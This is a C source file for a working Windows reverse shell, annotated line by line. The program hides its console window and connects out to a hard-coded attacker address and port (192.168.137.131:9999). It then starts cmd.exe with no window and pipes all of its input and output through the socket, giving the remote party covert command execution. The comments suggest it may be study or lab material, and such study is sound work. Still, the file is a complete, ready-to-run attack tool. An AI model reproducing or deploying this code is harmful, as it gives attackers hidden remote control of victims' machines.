#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")



int main(){
    //Hides cmd
    FreeConsole();
    SOCKET shell;
    WSADATA ver;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    struct sockaddr_in shell_addr;
    char ip_addr[] = "192.168.137.131";
    char RecData[512];
    int port = 9999;
    int connection;
    
    //Initializing WinSock Version 2
    WSAStartup(MAKEWORD(2,2), &ver);
    //Create TCP Socket
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); 

    //Shell Configuration
    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    //Connecting to Target Server
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR){
        printf("[i] Connection Failed");
        closesocket(shell);
        WSACleanup();
    }
    else{
        //Recv Socket, Where to Store Data, Max Size to Receive, 0
        recv(shell, RecData, sizeof(RecData), 0);
        //Set Value of Startup Infra Buffer to 0 (& means address)
        memset(&sinfo, 0, sizeof(sinfo));
        //Size of Structure
        sinfo.cb = sizeof(sinfo);
        //Determines whether startup info users are used when process creates a window
        //STARTF_USESTDHANDLES - Used for Standard Input, Output and Error
        //STARTF_USESHOWWINDOW - Contains Additional Information 
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        //Pipe Standard Input, Output and Error to Socket
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) shell;
        //Using CreateProcess API to spawn cmd
        //NULL, Process to Spawn, NULL, NULL, BOOLEAN, DWORD INT, NULL, NULL, Address of Startup Information Structure, Address of Process Information Structure
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
        //Startup Process
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
        //Set Value of Receiving Server Buffer to 0
        memset(RecData, 0, sizeof(RecData));
    }
}